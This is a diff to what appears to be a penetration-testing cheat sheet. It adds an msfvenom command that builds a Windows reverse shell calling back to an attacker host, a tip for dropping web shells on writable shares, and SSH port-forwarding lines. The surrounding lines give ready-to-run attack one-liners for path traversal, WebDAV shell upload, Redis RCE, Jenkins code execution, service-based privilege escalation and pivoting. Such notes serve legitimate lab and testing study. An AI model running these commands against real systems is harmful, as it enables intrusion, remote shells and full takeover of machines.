@@ -119,6 +119,8 @@ curl --path-as-is "http://$IP/../../../../etc/passwd"   # curl strips ../ withou
 # GraphQL introspection:  POST /graphql {"query":"{__schema{types{name fields{name}}}}"}   (InQL, graphw00f)
 # Deserialization: Java ysoserial | .NET ysoserial.net ViewState | Python pickle | Node node-serialize
 # WebDAV:  davtest -url http://<ip>   ;  curl -T shell.php http://<ip>/   (upload .txt then MOVE if filtered)
+# writable SMB/FTP share that IS the web root: put shell, then curl it. IIS runs .aspx, Apache .php
+#   msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f aspx -o shell.aspx
 # Jenkins /script (Groovy):  println 'id'.execute().text
 # Redis unauth -> SSH key:  config set dir /var/lib/redis/.ssh ; config set dbfilename authorized_keys ; set x '<pubkey>' ; save
 # Redis as root, nothing to key? module RCE:  module load /tmp/module.so ; system.exec 'id'   (RedisModules-ExecuteCommand)
@@ -346,6 +348,8 @@ accesschk.exe -uwcqv <user> *                 # services you may reconfigure
 sc config <svc> binpath= "cmd /c net localgroup administrators <user> /add" && sc start <svc>
 #   Server Operators group members can do the above to any service = SYSTEM, no file dropped
 # open Squid proxy (3128/8080)? that is a free tunnel - proxychains conf:  http <ip> 3128
+ss -tulpn                                      # then forward anything bound to 127.0.0.1 only
+ssh -L 3306:127.0.0.1:3306 <user>@$IP          # loopback services are usually unauthenticated
 # Windows foothold, no sshd? dial out instead - it ships an OpenSSH *client*:
 ssh -R 1080 -N <user>@$LHOST                   # older boxes: plink.exe -ssh -l <u> -pw <p> -R 1080 $LHOST
 netsh interface portproxy add v4tov4 listenport=9999 connectaddress=<internal> connectport=3389   # admin, no upload
